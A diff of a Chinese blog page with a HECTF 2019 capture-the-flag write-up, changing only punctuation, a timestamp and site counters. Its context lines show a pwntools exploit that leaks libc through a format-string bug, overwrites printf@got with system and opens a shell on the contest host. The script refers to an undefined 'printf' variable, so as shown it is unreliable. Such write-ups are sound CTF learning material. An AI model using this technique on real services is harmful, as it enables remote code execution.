@@ -119,18 +119,18 @@
 
 
 
-  <meta name="description" content="Middle_pwn 格式化字符串泄露地址后直接写printf@got,调用system(&quot;/bin/sh&quot;) 1234567891011121314151617181920212223242526272829303132333435from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;183.129.189.60&quot;, &quot;10003&quot;)elf =">
+  <meta name="description" content="Middle_pwn 格式化字符串泄露地址后直接写printf@got,调用system(&quot;/bin/sh&quot;). 1234567891011121314151617181920212223242526272829303132333435from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;183.129.189.60&quot;, &quot;10003&quot;)elf =">
 <meta name="keywords" content="Jeopardy">
 <meta property="og:type" content="article">
 <meta property="og:title" content="writeup-hectf-2019-quals">
 <meta property="og:url" content="https://hitworld.github.io/posts/d8a417f2/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="Middle_pwn 格式化字符串泄露地址后直接写printf@got,调用system(&quot;/bin/sh&quot;) 1234567891011121314151617181920212223242526272829303132333435from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;183.129.189.60&quot;, &quot;10003&quot;)elf =">
+<meta property="og:description" content="Middle_pwn 格式化字符串泄露地址后直接写printf@got,调用system(&quot;/bin/sh&quot;). 1234567891011121314151617181920212223242526272829303132333435from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;183.129.189.60&quot;, &quot;10003&quot;)elf =">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-08-09T06:34:17.853Z">
+<meta property="og:updated_time" content="2020-08-15T15:31:27.010Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-hectf-2019-quals">
-<meta name="twitter:description" content="Middle_pwn 格式化字符串泄露地址后直接写printf@got,调用system(&quot;/bin/sh&quot;) 1234567891011121314151617181920212223242526272829303132333435from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;183.129.189.60&quot;, &quot;10003&quot;)elf =">
+<meta name="twitter:description" content="Middle_pwn 格式化字符串泄露地址后直接写printf@got,调用system(&quot;/bin/sh&quot;). 1234567891011121314151617181920212223242526272829303132333435from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;183.129.189.60&quot;, &quot;10003&quot;)elf =">
 
 
 
@@ -531,7 +531,7 @@
 
       
         <h2 id="middle_pwn">Middle_pwn</h2>
-<p>格式化字符串泄露地址后直接写<code>printf@got</code>,调用<code>system("/bin/sh")</code></p>
+<p>格式化字符串泄露地址后直接写<code>printf@got</code>,调用<code>system("/bin/sh")</code>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./pwn")</span></span><br><span class="line">r = remote(<span class="string">"183.129.189.60"</span>, <span class="string">"10003"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r, "b printf\nc")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%3$paaaa"</span></span><br><span class="line">r.sendlineafter(<span class="string">"Input: \n"</span>, payload)</span><br><span class="line">libc = int(r.recvuntil(<span class="string">"aaaa"</span>)[:<span class="number">-4</span>], <span class="number">16</span>) + <span class="number">0x7fdf719a5000</span> - <span class="number">0x7fdf71a9c260</span></span><br><span class="line"></span><br><span class="line">system = libc + <span class="number">0x45390</span></span><br><span class="line">x = printf % <span class="number">0x100</span></span><br><span class="line">y = (printf / <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">z = (printf / <span class="number">0x10000</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (x &lt; y) <span class="keyword">or</span> (x &lt; z):</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> y &gt; z:</span><br><span class="line">    payload += <span class="string">"%"</span> + str(z) + <span class="string">"c"</span> + <span class="string">"%13$hhn"</span> + <span class="string">"%"</span> + str(y - z) + <span class="string">"c"</span> + <span class="string">"%12$hhn"</span> + <span class="string">"%"</span> + str(x - y) + <span class="string">"c"</span> + <span class="string">"%11$hhn"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload += <span class="string">"%"</span> + str(y) + <span class="string">"c"</span> + <span class="string">"%12$hhn"</span> + <span class="string">"%"</span> + str(z - y) + <span class="string">"c"</span> + <span class="string">"%13$hhn"</span> + <span class="string">"%"</span> + str(x - z) + <span class="string">"c"</span> + <span class="string">"%11$hhn"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">"printf"</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">"printf"</span>] + <span class="number">1</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">"printf"</span>] + <span class="number">2</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Input: \n"</span>, payload)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"Input: \n"</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="stackpwn2">stackpwn2</h2>
 <p>泄露<code>canary</code>后正常<code>ROP</code>即可.</p>
@@ -667,7 +667,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">177</span>
+                    <span class="site-state-item-count">178</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -891,7 +891,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">726k</span>
+    <span title="站点总字数">730k</span>
   
 
   
@@ -900,7 +900,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">11:04</span>
   
 </div>
 
